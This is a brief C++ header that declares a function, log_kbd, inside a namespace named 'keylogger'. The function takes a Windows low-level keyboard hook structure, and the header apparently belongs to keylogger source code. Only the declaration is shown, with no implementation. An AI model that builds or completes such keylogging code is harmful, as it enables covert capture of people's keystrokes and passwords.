#pragma once

#include <fstream>
#include <Windows.h>

namespace keylogger {
	void log_kbd(const KBDLLHOOKSTRUCT& kbd_hook);
};
